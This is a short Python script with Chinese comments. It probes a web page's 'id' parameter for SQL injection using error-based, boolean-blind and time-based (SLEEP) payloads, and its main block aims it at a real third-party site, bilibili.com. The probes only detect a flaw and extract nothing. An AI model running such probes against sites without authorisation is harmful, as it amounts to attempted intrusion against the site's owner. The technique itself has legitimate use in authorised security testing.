import requests
import time

def test_sql_injection_auto(base_url: str, param: str = "id"):
    print(f"[*] 正在测试 {base_url} 参数 {param} 是否存在 SQL 注入...")
    payloads = {
        "报错注入": f"{base_url}?{param}=1'",
        "布尔注入-真": f"{base_url}?{param}=1 AND 1=1",
        "布尔注入-假": f"{base_url}?{param}=1 AND 1=2",
        "时间注入": f"{base_url}?{param}=1 AND SLEEP(5)"
    }

    try:
        r1 = requests.get(payloads["报错注入"], timeout=5)
        if "sql" in r1.text.lower() or "syntax" in r1.text.lower() or "warning" in r1.text.lower():
            print("[+] 报错注入可能存在！")

        r_true = requests.get(payloads["布尔注入-真"], timeout=5)
        r_false = requests.get(payloads["布尔注入-假"], timeout=5)
        if abs(len(r_true.text) - len(r_false.text)) > 10:
            print("[+] 布尔盲注可能存在！（响应差异明显）")

        start = time.time()
        requests.get(payloads["时间注入"], timeout=10)
        elapsed = time.time() - start
        if elapsed > 4:
            print(f"[+] 时间盲注可能存在！（响应延迟 {elapsed:.2f} 秒）")

    except requests.RequestException as e:
        print(f"[-] 请求失败：{e}")

    print("[*] 测试结束。")

# ✅ 主函数调用入口（替代 pytest）
if __name__ == "__main__":
    # 替换为你目标网站的 URL
    test_sql_injection_auto("https://www.bilibili.com/", param="id")
